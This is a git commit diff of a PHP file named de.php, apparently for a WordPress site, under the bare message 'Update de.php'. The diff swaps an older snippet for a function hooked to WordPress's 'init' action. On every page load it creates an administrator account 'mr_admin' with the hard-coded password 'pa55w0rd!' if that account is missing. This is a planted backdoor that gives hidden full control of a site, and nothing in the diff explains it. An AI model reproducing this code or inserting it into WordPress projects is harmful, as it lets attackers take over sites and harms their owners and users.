bacf7f694d640f888c5e6afa073cb1bb4e8ff2a2
Arman ali <armanalin00786@gmail.com>
2024-01-04 17:29:32 +0530

    Update de.php

--- de.php
+++ de.php
@@ -1,7 +1,10 @@
-require( 'wp-includes/registration.php' );
-    if ( !username_exists( 'mr_admin' ) ) {
-        $user_id = wp_create_user( 'mr_admin', 'pa55w0rd!' );
-        $user = new WP_User( $user_id );
-        $user->set_role( 'administrator' ); 
-}
+function create_admin_user_if_not_exists() {
+    if (!username_exists('mr_admin')) {
+        require_once(ABSPATH . 'wp-includes/registration.php');
 
+        $user_id = wp_create_user('mr_admin', 'pa55w0rd!');
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+add_action('init', 'create_admin_user_if_not_exists');
